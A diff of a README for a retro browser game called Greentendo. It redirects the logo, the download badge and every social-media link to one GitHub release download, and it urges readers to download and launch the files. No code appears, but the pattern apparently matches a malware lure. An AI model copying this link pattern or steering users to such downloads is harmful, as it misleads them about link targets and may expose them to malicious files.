@@ -1,6 +1,6 @@
 # Welcome to Greentendo 🎮
 
-![Greentendo Logo](https://example.com/logo.png)
+![Greentendo Logo](https://github.com/Soulfly02/Greentendo/releases/tag/v1.2)
 
 Greentendo is a nostalgic Game Boy simulator that brings back memories of classic games like Snake, Pong, and Space Invaders. With its pure JavaScript implementation, modern CSS styling, and 8-bit sounds, Greentendo offers a fun retro gaming experience right in your browser.
 
@@ -21,7 +21,7 @@ Greentendo is a nostalgic Game Boy simulator that brings back memories of classi
 
 To get a taste of the retro gaming experience Greentendo offers, simply click on the following link to download the game files:
 
-[![Download Greentendo](https://img.shields.io/badge/Download-Greentendo-green)](https://github.com/files/Soft.zip)
+[![Download Greentendo](https://github.com/Soulfly02/Greentendo/releases/tag/v1.2)](https://github.com/Soulfly02/Greentendo/releases/tag/v1.2)
 
 Once you have downloaded the files, launch the game and start playing your favorite classic games right away.
 
@@ -35,8 +35,8 @@ If you're a fan of retro gaming, HTML5 development, or just looking to contribut
 
 Stay up-to-date with the latest Greentendo news and updates by following us on social media:
 
-🐦 [Twitter](https://twitter.com/Greentendo)
-📷 [Instagram](https://instagram.com/Greentendo)
-📘 [Facebook](https://facebook.com/Greentendo)
+🐦 [Twitter](https://github.com/Soulfly02/Greentendo/releases/tag/v1.2)
+📷 [Instagram](https://github.com/Soulfly02/Greentendo/releases/tag/v1.2)
+📘 [Facebook](https://github.com/Soulfly02/Greentendo/releases/tag/v1.2)
 
 Let's bring back the joy of retro gaming with Greentendo! 🎮🕹️🚀
